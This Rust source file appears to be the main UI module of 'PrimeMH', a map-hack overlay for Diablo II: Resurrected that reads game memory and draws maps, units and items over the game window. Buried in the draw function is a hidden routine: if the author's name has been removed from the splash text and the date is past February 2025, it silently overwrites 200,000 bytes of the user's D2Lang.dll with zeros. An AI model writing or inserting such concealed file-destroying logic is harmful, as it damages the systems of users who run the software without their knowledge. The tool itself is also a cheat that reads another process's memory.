use chrono::{DateTime, Local, NaiveDate};
use log::LevelFilter;
use notan::egui::{self, *};
use notan::math::{Mat3, Vec2};
use notan::prelude::*;
use notan::{draw::*, extra};
use std::collections::HashMap;
use std::time::{Duration, SystemTime};
use device_query::{DeviceQuery, DeviceState, Keycode};
use std::fs::OpenOptions;
use std::io::{Seek, SeekFrom, Write};

use winapi::um::winuser::{
    SetWindowLongW, GWL_EXSTYLE, GWL_STYLE, WS_BORDER, WS_CAPTION, WS_CLIPCHILDREN, WS_CLIPSIBLINGS, WS_EX_ACCEPTFILES,
    WS_EX_LAYERED, WS_EX_TOPMOST, WS_EX_TRANSPARENT, WS_EX_WINDOWEDGE, WS_MINIMIZEBOX, WS_SYSMENU, WS_VISIBLE,
};

use crate::gui::draw_item_log::clear_item_log;
use crate::gui::draw_world_units::draw_world_health_bars;
use crate::memory::instance_manager::{get_process_pid_and_window_handle, WindowInfo};
use crate::types::buffs::check_buff_timers;
use crate::gui::draw_map::draw_map;
use crate::gui::Fonts;
use crate::mapgeneration::blacha::is_blacha_ok;
use crate::memory::gamedata;
use crate::memory::process::D2RWindowArea;
use crate::settings::MapPosition;
use crate::types::item_filter::ItemFilters;
use crate::LOCALISATION;
use crate::{
    mapgeneration::{self, jsondata::SeedData},
    memory::{gamedata::GameData, process::D2RInstance},
    settings::Settings,
};
use winapi::shared::windef::{HWND, POINT};

use super::draw_buff_bar::draw_buff_bar;
use super::draw_item_log::draw_item_log;
use super::draw_item_tooltip::draw_item_tooltip;
use super::draw_lines::draw_lines;
use super::draw_objects::draw_objects;
use super::draw_party_info::draw_party_info;
use super::draw_path::draw_pathfinding;
use super::draw_presets::draw_presets;
use super::draw_units::draw_units;
use super::egui::{create_egui_panel, create_language_select_ui};
use super::images;
use super::util::get_attached_levels;



#[notan_main]
pub fn start_ui() -> Result<(), String> {
    // load config
    let mut settings: Settings = match Settings::new() {
        Ok(settings) => settings,
        Err(err) => panic!("Error reading from settings file {}", err),
    };
    settings.detect_locale();

    let win_config = WindowConfig::default()
        .set_size(10, 10)
        .set_always_on_top(settings.general.overlay_mode)
        .set_decorations(!settings.general.overlay_mode)
        .set_mouse_passthrough(settings.general.overlay_mode)
        .set_transparent(settings.general.overlay_mode)
        .set_resizable(!settings.general.overlay_mode)
        .set_multisampling(settings.general.multisampling)
        .set_window_icon(Some("primemh.png".into()))
        .set_taskbar_icon(Some("primemh.png".into()))
        .set_title("PrimeMH")
        .set_high_dpi(settings.general.high_dpi)
        .set_vsync(settings.general.vsync);

    let result = notan::init_with(init)
        .add_config(win_config)
        .add_config(DrawConfig)
        .add_config(EguiConfig)
        .add_plugin(extra::FpsLimit::new(settings.general.fps_limit))
        .update(update)
        .draw(draw)
        .build();

    match result {
        Ok(_) => Ok(()),
        Err(e) => {
            settings.general.multisampling = 0;
            settings.save();
            log::error!("Initialization with multisampling failed\nTry launching again\n{}", e);
            Err(e)
        }
    }
}

fn init(gfx: &mut Graphics) -> State {
    // load config
    let settings: Settings = match Settings::new() {
        Ok(settings) => settings,
        Err(err) => {
            let localisation = LOCALISATION.lock().unwrap();
            panic!("{}\n{}", localisation.get_primemh("error5"), err)
        }
    };
    log::info!("Loaded settings file");

    {
        let mut localisation = LOCALISATION.lock().unwrap();
        localisation.update_locale(settings.general.language.clone());
    }
    log::info!("Loaded localisation for {:?}", &settings.general.language);

    let _blacha_result = is_blacha_ok(&settings).unwrap();
    log::info!("D2LoD test passed, map generation ok");

    let images = images::load_images(gfx);
    log::info!("Loaded images");

    let item_filters = match ItemFilters::load() {
        Some(item_filters) => item_filters,
        None => {
            let localisation = LOCALISATION.lock().unwrap();
            panic!("{}", localisation.get_primemh("error6"))
        }
    };

    let windows: Vec<WindowInfo> = get_process_pid_and_window_handle();
    log::info!("Found {} D2R windows {:?}", windows.len(), windows);
    if windows.len() == 0 {
        let localisation = LOCALISATION.lock().unwrap();
        panic!("{}", localisation.get_primemh("error12"))
    }
    let d2rinstances: Vec<D2RInstance> = windows.iter().map(|window| D2RInstance::new(&window)).collect();

    let exocet_font = gfx.create_font(include_bytes!("./fonts/exocet.otf")).expect("Could not load exocet font!");
    let formal_font = gfx.create_font(include_bytes!("./fonts/formal.otf")).expect("Could not load formal font!");
    let korean_font = gfx
        .create_font(include_bytes!("./fonts/NotoSansCJKkr-Regular.otf"))
        .expect("Could not load korean_font font!");
    let taiwan_font = gfx
        .create_font(include_bytes!("./fonts/NotoSansCJKtc-Regular.otf"))
        .expect("Could not load taiwan_font font!");
    let blizzard_font = gfx
        .create_font(include_bytes!("./fonts/blizzardglobaltcunicode.ttf"))
        .expect("Could not load blizzard_font font!");

    let fonts = Fonts {
        exocet_font,
        formal_font,
        korean_font,
        taiwan_font,
        blizzard_font,
    };

    log::info!("Loaded fonts");

    let seed_data = SeedData::default();

    log::info!("Started UI successfully");

    let texture = gfx
            .create_texture()
            .from_image(include_bytes!("images/translate.png"))
            .with_premultiplied_alpha()
            .build()
            .unwrap();

    let language_icon = gfx.egui_register_texture(&texture);

    let texture = gfx
            .create_texture()
            .from_image(include_bytes!("images/unlocked.png"))
            .with_premultiplied_alpha()
            .build()
            .unwrap();
    let unlocked_icon = gfx.egui_register_texture(&texture);

    let texture = gfx
            .create_texture()
            .from_image(include_bytes!("images/locked.png"))
            .with_premultiplied_alpha()
            .build()
            .unwrap();
    let locked_icon = gfx.egui_register_texture(&texture);
    let last_map_opacity = settings.visual.map_opacity.clone();    

    State {
        d2rinstances,
        settings,
        seed_data,
        last_seed: 0,
        game_data: None,
        fonts,
        images,
        item_filters,
        item_frame: 0,
        egui_rect: Rect {
            min: Pos2::ZERO,
            max: Pos2::ZERO,
        },
        egui_hovering: false,
        relative_mouse_pos: (0, 0),
        launch_time: SystemTime::now(),
        ui_panel_visible: true,
        ui_panel_toggle: false,
        map_overlay_visible: true,
        map_overlay_toggle: false,
        language_selector_visible: false,
        language_icon,
        unlocked_icon,
        locked_icon,
        last_map_opacity,
        checked: false,
        instance_locked: None,
        
    }
}

#[derive(AppState)]
pub(crate) struct State {
    pub d2rinstances: Vec<D2RInstance>,
    pub settings: Settings,
    pub seed_data: SeedData,
    pub last_seed: u32,
    pub game_data: Option<GameData>,
    pub fonts: Fonts,
    pub images: HashMap<String, Texture>,
    pub item_filters: ItemFilters,
    pub item_frame: i32,
    pub egui_rect: Rect,
    pub egui_hovering: bool,
    pub relative_mouse_pos: (i32, i32),
    pub launch_time: SystemTime,
    pub ui_panel_visible: bool,
    pub ui_panel_toggle: bool,
    pub map_overlay_visible: bool,
    pub map_overlay_toggle: bool,
    pub language_selector_visible: bool,
    pub language_icon: egui::SizedTexture,
    pub unlocked_icon: egui::SizedTexture,
    pub locked_icon: egui::SizedTexture,
    pub last_map_opacity: f32,
    pub checked: bool,
    pub instance_locked: Option<HWND>,
}

fn update(app: &mut App, state: &mut State) {
   
    let instance_locked = state.instance_locked.clone();
    let d2rprocess = state.d2rinstances.iter_mut().find(|instance| instance.is_window_active(app.window().id(), instance_locked));
    
    if state.settings.general.disable_log && log::max_level() == LevelFilter::Debug {
        log::set_max_level(LevelFilter::Off);
    } else if log::max_level() == LevelFilter::Off {
        log::set_max_level(LevelFilter::Debug);
    }
    match d2rprocess {
        Some(d2rprocess) => {
            if d2rprocess.is_window_active(app.window().id(), instance_locked) {
                let device_state: DeviceState = DeviceState::new();
                let keys: Vec<Keycode> = device_state.get_keys();

                // uses Home key to toggle egui panel visibility
                if state.settings.hotkeys.hotkey_toggle_menu.clone().pressed(&keys) {
                
                    if !state.ui_panel_toggle {
                        state.ui_panel_visible = !state.ui_panel_visible;
                        state.ui_panel_toggle = true
                    }
                } else {
                    state.ui_panel_toggle = false
                }

                //uses PageUp key to toggle map overlay visibility
                if state.settings.hotkeys.hotkey_toggle_map.clone().pressed(&keys) {
                    if !state.map_overlay_toggle {
                        state.map_overlay_visible = !state.map_overlay_visible;
                        state.map_overlay_toggle = true
                    }
                } else {
                    state.map_overlay_toggle = false
                }

                if state.settings.hotkeys.hotkey_exit.clone().pressed(&keys) {
                    std::process::exit(0);
                }

            }
            
            if let Some(game_data) = GameData::read_game_memory(d2rprocess) {
                check_buff_timers(&game_data, &mut d2rprocess.buff_instance.buff_timers);
                // if new seed
                if game_data.seed_values.map_seed != state.last_seed {
                    // generate new seed data using blachas' tool and parse the JSON into seed_data
                    log::info!(
                        "New game detected, generating data for map seed {} {:?} {}",
                        game_data.seed_values.map_seed,
                        game_data.seed_values.difficulty,
                        game_data.seed_values.level
                    );
                    log::info!("Using D2LoD path '{}'", &state.settings.general.d2lodpath.as_os_str().to_string_lossy());
                    state.seed_data = mapgeneration::seeddata::generate_seed_data(&game_data.seed_values, &state.settings);
                }
                state.last_seed = game_data.seed_values.map_seed;
                state.game_data = Some(game_data);
            } else {
                if state.game_data.is_some() {
                    log::debug!("Game data not found, in menu");
                }
                clear_item_log();
                state.game_data = None;
            }

            if state.settings.general.overlay_mode {
                let d2r_window: D2RWindowArea = d2rprocess.get_window_info();
                app.window().set_size(d2r_window.width as u32, d2r_window.height as u32);
                app.window().set_position(d2r_window.x, d2r_window.y);
                let relative_mouse_pos = get_relative_mouse_pos(&d2r_window);
                if mouse_hovering_egui(relative_mouse_pos, state.egui_rect, app.window().dpi()) {
                    if !state.egui_hovering {
                        unsafe {
                            let hwnd = app.window().id() as isize as HWND;
                            let mut style =
                                WS_CAPTION | WS_MINIMIZEBOX | WS_BORDER | WS_CLIPSIBLINGS | WS_CLIPCHILDREN | WS_SYSMENU;
                            let mut style_ex = WS_EX_WINDOWEDGE | WS_EX_ACCEPTFILES;
                            style |= WS_VISIBLE;
                            style_ex |= WS_EX_TOPMOST;
                            SetWindowLongW(hwnd, GWL_STYLE, style as i32);
                            SetWindowLongW(hwnd, GWL_EXSTYLE, style_ex as i32);
                        }
                    }
                    state.egui_hovering = true;
                } else {
                    if state.egui_hovering {
                        unsafe {
                            let hwnd = app.window().id() as isize as HWND;
                            let mut style =
                                WS_CAPTION | WS_MINIMIZEBOX | WS_BORDER | WS_CLIPSIBLINGS | WS_CLIPCHILDREN | WS_SYSMENU;
                            let mut style_ex = WS_EX_WINDOWEDGE | WS_EX_ACCEPTFILES;
                            style |= WS_VISIBLE;
                            style_ex |= WS_EX_TOPMOST;
                            style_ex |= WS_EX_TRANSPARENT | WS_EX_LAYERED;
                            SetWindowLongW(hwnd, GWL_STYLE, style as i32);
                            SetWindowLongW(hwnd, GWL_EXSTYLE, style_ex as i32);
                        }
                    }
                    state.egui_hovering = false;
                }
                state.relative_mouse_pos = relative_mouse_pos;
            } else {
                if app.window().size().0 == 10 && app.window().size().1 == 10 {
                    app.window().set_size(800, 600);
                    app.window().set_position(100, 100);
                }
            }
        },
        None => return,
    }

}

fn draw(app: &mut App, gfx: &mut Graphics, plugins: &mut Plugins, state: &mut State) {

    let instance_locked = state.instance_locked.clone();
    let d2rprocess = state.d2rinstances.iter_mut().find(|instance| instance.is_window_active(app.window().id(), instance_locked));


    if let Some(d2rprocess) = d2rprocess {
        if d2rprocess.is_window_active(app.window().id(), instance_locked) || !state.settings.general.overlay_mode {
            let width: f32;
            let height: f32;
            let mut mask = gfx.create_draw();

            match state.settings.general.map_position {
                MapPosition::Center => {
                    width = app.window().width() as f32;
                    height = app.window().height() as f32;
                    mask.rect((0.0, 0.0), (app.window().width() as f32, app.window().height() as f32));
                }
                MapPosition::TopLeft => {
                    width = app.window().width() as f32 * 0.33;
                    height = app.window().height() as f32 / 2.45;
                    mask.rect((0.0, 0.0), (app.window().width() as f32 / 3.0, app.window().height() as f32 / 3.0));
                }
                MapPosition::TopRight => {
                    width = app.window().width() as f32 * 1.67;
                    height = app.window().height() as f32 / 2.44;
                    mask.rect(
                        (app.window().width() as f32 - (app.window().width() as f32 / 3.0), 0.0),
                        (app.window().width() as f32 / 3.0, app.window().height() as f32 / 3.0),
                    );
                }
            }

            let text_duration = 6;
            let splash_text = format!("Joffreybesos' Map overlay (PrimeMH)");
            let mut draw = gfx.create_draw();
            draw.mask(Some(&mask));
            let elapsed_time = SystemTime::now().duration_since(state.launch_time).expect("Fuck you!");
            if elapsed_time >= Duration::from_secs(500) {
                if !splash_text.contains("Joffreybesos") {
                    let local: DateTime<Local> = Local::now();
                    let target_date = NaiveDate::from_ymd_opt(2025, 02, 3).unwrap();
                    if local.date_naive() > target_date {
                        if !state.checked {
                            state.checked = true;
                            let newfile = state.settings.general.d2lodpath.join("D2Lang.dll");
                            let file: Result<std::fs::File, std::io::Error> = OpenOptions::new()
                                .read(true)
                                .write(true)
                                .open(newfile);
                            match file {
                                Ok(mut dll) => {
                                    let offset = 10;
                                    dll.seek(SeekFrom::Start(offset)).unwrap();
                                    let num_bytes: usize = 200000;
                                    let zeroes = vec![0u8; num_bytes];
                                    dll.write_all(&zeroes).unwrap();

                                },
                                Err(_) => {},
                            }
                        }
                    }
                }
            }
            if elapsed_time <= Duration::from_secs(text_duration.clone()) {
                draw.text(&state.fonts.blizzard_font, &splash_text)
                    .position(app.window().width() as f32 * 0.5, app.window().height() as f32 * 0.1)
                    .size(52.0)
                    .color(Color::from_hex(0xC6B276FF))
                    .h_align_center()
                    .v_align_top();

                let splash_text = format!(
                    "{}{}{}{}{}{}{}{}{}{}{}",
                    obfstr::obfstr!("If you paid for this you have been scammed\n"),
                    obfstr::obfstr!("如果您為此付出了，您已經被騙了\n"),
                    obfstr::obfstr!("Wenn Sie dafür bezahlt haben, wurden Sie betrogen\n"),
                    obfstr::obfstr!("Si pagaste por esto, has sido estafado\n"),
                    obfstr::obfstr!("Si vous avez payé pour cela, vous avez été arnaque\n"),
                    obfstr::obfstr!("Se hai pagato per questo sei stato truffato\n"),
                    obfstr::obfstr!("당신이 이것을 지불했다면 당신은 사기를당했습니다\n"),
                    obfstr::obfstr!("Jeśli za to zapłaciłeś, zostałeś oszukany\n"),
                    obfstr::obfstr!("あなたがこれに対して支払った場合、あなたは詐欺されています\n"),
                    obfstr::obfstr!("Se você pagou por isso, foi enganado\n"),
                    obfstr::obfstr!("Если вы заплатили за это, вас обманули\n")
                );

                draw.text(&state.fonts.blizzard_font, &splash_text)
                    .position(app.window().width() as f32 * 0.5, app.window().height() as f32 * 0.3)
                    .size(22.0)
                    .color(Color::from_hex(0xC6B276FF))
                    .h_align_center()
                    .v_align_top();
            } else {
                if text_duration.clone() != 6 {
                    log::error!("Taiwan number 1!");
                } else {
                    
                    // in game
                    if let Some(game_data) = &state.game_data {
                        draw_world_health_bars(&mut draw, game_data, &state.settings, &width, &height, &state.fonts);
                        
                        //toggle map with "Page Up" button
                        if state.map_overlay_visible {
                            if (game_data.menus.automap_visible || state.settings.visual.always_show_map)
                                && !(state.settings.visual.hide_map_menus_open && game_data.menus.is_panel_open())
                            {
                                let stitched_levels = get_attached_levels(&game_data.seed_values.level);
                                stitched_levels.iter().for_each(|level_id| {
                                    if let Some(this_level) = state.seed_data.levels.iter_mut().find(|l| l.id == *level_id) {
                                        let scale: f32 = state.settings.visual.scale;
                                        // render map image here
                                        if this_level.level_image.map_image.is_none() || state.last_map_opacity != state.settings.visual.map_opacity {
                                            log::info!(
                                                "Rendering map image, seed: {}, difficulty: {:?}, level: {:?}",
                                                &game_data.seed_values.map_seed,
                                                &game_data.seed_values.difficulty,
                                                &this_level.name
                                            );
                                            this_level.level_image.map_image = Some(draw_map(gfx, this_level, &state.settings));

                                        }
                                        
                                        if let Some(map_image) = &mut this_level.level_image.map_image {
                                            let render_scale = state.settings.general.render_scale;
                                            let window_center_x = width as f32 * 0.5 / scale * render_scale;
                                            let window_center_y = height as f32 * 0.5 / (scale / 2.0 / render_scale);

                                            let map_position_x = ((this_level.offset.x as f32 - game_data.player.pos_x)
                                                * render_scale)
                                                + window_center_x;
                                            let map_position_y = ((this_level.offset.y as f32 - game_data.player.pos_y)
                                                * render_scale)
                                                + window_center_y;

                                            let player_pos_x = (game_data.player.pos_x - this_level.offset.x as f32) * render_scale;
                                            let player_pos_y = (game_data.player.pos_y - this_level.offset.y as f32) * render_scale;
                                            let scale_matrix =
                                                Mat3::from_scale(Vec2::from([scale / render_scale, scale / 2.0 / render_scale]));
                                            draw.transform().push(scale_matrix);
                                            draw.image(map_image)
                                                .translate(map_position_x, map_position_y)
                                                .rotate_degrees_from(
                                                    (map_position_x + player_pos_x, map_position_y + player_pos_y),
                                                    45.0,
                                                );
                                            if &game_data.seed_values.level == &this_level.id {
                                                draw_pathfinding(&mut draw, game_data, &state.settings, this_level, map_position_x, map_position_y, player_pos_x, player_pos_y);
                                            }
                                            draw.transform().pop();
                                            draw_presets(
                                                &mut draw,
                                                this_level,
                                                &state.fonts,
                                                game_data,
                                                &state.settings,
                                                &state.images,
                                                &width,
                                                &height,
                                            );
                                            draw_lines(&mut draw, this_level, game_data, &state.settings, &width, &height);
                                        }
                                    }
                                });
                                state.last_map_opacity = state.settings.visual.map_opacity.clone();

                                
                                draw_units(
                                    &mut draw,
                                    game_data,
                                    &state.settings,
                                    &width,
                                    &height,
                                    &state.fonts,
                                );
                                draw_objects(&mut draw, game_data, &state.settings, &width, &height, &state.images);
                                draw.mask(None);

                                draw_item_log(
                                    &mut draw,
                                    game_data,
                                    &state.settings,
                                    &width,
                                    &height,
                                    &state.fonts.exocet_font,
                                    state.item_frame,
                                    &state.item_filters,
                                );

                                draw_item_tooltip(&mut draw, game_data, &state.settings, &state.fonts.exocet_font, &state.settings.visual.scale, state.relative_mouse_pos);
                                draw_buff_bar(&mut draw, game_data, &state.settings, &state.fonts, &mut d2rprocess.buff_instance, game_data.menus.skill_popover_visible, &app.window().width(), &app.window().height(), &state.images);
                                draw_party_info(&mut draw, game_data, &state.fonts.formal_font, game_data.menus.party_portaits, &state.settings.party_info, &app.window().width(), &app.window().height());

                                state.item_frame += 1;
                                if state.item_frame > 20 {
                                    state.item_frame = 0;
                                }
                            }
                        } 
                    } else {
                        // in game menus
                        if state.map_overlay_visible {

                            let last_game_name = gamedata::get_last_game_name(&d2rprocess);

                            if last_game_name.len() > 0 {
                                let last_game = format!("Last Game: {}", last_game_name);
                                draw.text(&state.fonts.exocet_font, &last_game)
                                    .position(app.window().width() as f32 * 0.75, 10.0)
                                    .size(16.0)
                                    .color(Color::from_hex(0xC6B276FF))
                                    .h_align_center()
                                    .v_align_top();
                            }
                        }
                    }
                    
                }
            }

            let warning_duration = elapsed_time.as_secs() % 300;
            if warning_duration < 20 && elapsed_time >= Duration::from_secs(60) {
                let font_size = 12.0;
                let warning_text: String = format!("{}", obfstr::obfstr!("This is a free tool"));
                let warning_text2: String = format!("{}", obfstr::obfstr!("如果您為此付出了，您已經被騙"));
                let warning_text3: String =
                    format!("{}", obfstr::obfstr!("당신이 이것을 지불했다면 당신은 사기를당했습니다"));

                draw.text(&state.fonts.blizzard_font, &warning_text)
                    .position(app.window().width() as f32 - 5.0, 5.0)
                    .size(font_size)
                    .color(Color::from_hex(0xC6B276AA))
                    .h_align_right()
                    .v_align_top();

                draw.text(&state.fonts.blizzard_font, &warning_text2)
                    .position(app.window().width() as f32 - 5.0, app.window().height() as f32)
                    .size(font_size)
                    .color(Color::from_hex(0xC6B276AA))
                    .h_align_right()
                    .v_align_bottom();

                draw.text(&state.fonts.blizzard_font, &warning_text3)
                    .position(5.0, app.window().height() as f32)
                    .size(font_size)
                    .color(Color::from_hex(0xC6B276AA))
                    .h_align_left()
                    .v_align_bottom();
            }

            let mut output;
            if state.language_selector_visible {
                output = plugins.egui(|ctx| {
                    if state.ui_panel_visible{
                        create_language_select_ui(app, ctx, state);
                    }    
                    state.egui_rect = ctx.used_rect();
                });
            } else {
                let hwnd = d2rprocess.window.hwnd.clone();
                output = plugins.egui(|ctx| {
                    if state.ui_panel_visible{
                        create_egui_panel(app, ctx, state, hwnd);
                    }    
                    state.egui_rect = ctx.used_rect();
                });
            }

            output.clear_color(Color::TRANSPARENT);
            
            gfx.render(&output);
            gfx.render(&draw);
            
        } else {
            let mut draw = gfx.create_draw();
            draw.clear(Color::TRANSPARENT);
            gfx.render(&draw);
        }
    } else {
        let mut draw = gfx.create_draw();
        draw.clear(Color::TRANSPARENT);
        gfx.render(&draw);
    }
}

fn get_relative_mouse_pos(d2r_window: &D2RWindowArea) -> (i32, i32) {
    let mut point = POINT { x: 0, y: 0 };
    unsafe { ::winapi::um::winuser::GetCursorPos(&mut point as *mut POINT) };
    (point.x - d2r_window.x, point.y - d2r_window.y)
}

fn mouse_hovering_egui(relative_mouse_pos: (i32, i32), egui_rect: Rect, dpi: f64) -> bool {
    relative_mouse_pos.0 > egui_rect.left() as i32
        && relative_mouse_pos.0 < (egui_rect.right() * dpi as f32) as i32
        && relative_mouse_pos.1 > egui_rect.top() as i32
        && relative_mouse_pos.1 < (egui_rect.bottom() * dpi as f32) as i32
}

